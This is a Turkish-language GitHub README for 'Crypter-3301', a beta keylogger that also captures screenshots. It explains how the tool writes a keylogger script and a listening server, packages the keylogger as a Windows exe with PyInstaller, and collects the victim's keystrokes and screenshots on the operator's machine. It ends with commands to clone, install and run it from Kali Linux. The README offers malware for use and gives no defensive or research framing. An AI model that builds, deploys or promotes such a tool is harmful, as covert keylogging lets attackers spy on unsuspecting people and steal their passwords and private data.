# Crypter-3301(Beta)
Crypter 3301, Ero145 ile yaptığımız Ekran Görüntüsü Alabilen bir Keylogger Aracıdır.
Desteklerin için teşekkür ederim Dostum🙏🏻 (Ero145)

![WhatsApp Image 2024-12-31 at 17 48 52](https://github.com/user-attachments/assets/e041e137-7495-4b10-907d-84108bc64f53)

Program başlandığında bazı kütüphanelerin yüklü olup olmadığını kontrol eder. Ardından banner gelir ve keylogger.py, server.py, 
keylog.txt(Sunucuya gelen tuşlar bu dosyaya kaydedilir) ve images klasörü(SS lerin geleceği klasör) gibi gerekli dosyaları masaüstüne oluşturur.
Sonra program sizden oluşturulan keylogger.py dosyasının yolunu ister. Doğru Yol girilince python dosyasını exe ye çevirir(PyInstaller ile).
Exe başarılı bir şekilde oluşturulursa server.py çalıştırılır ve oluşturulan exe'nin açılması beklenir. Bazı ufak hatalar olabilir(Ufak hataları düzelteceğiz).
Unutmayın: !Dosyadaki desktop_path değişkenini Kali Linux'un masaüstü yolu yapın!

git clone https://github.com/zer0crypt02/Crypter-3301<br>
cd Crypter-3301<br>
pip3 install -r requirements.txt<br>
python3 Crypter3301.py
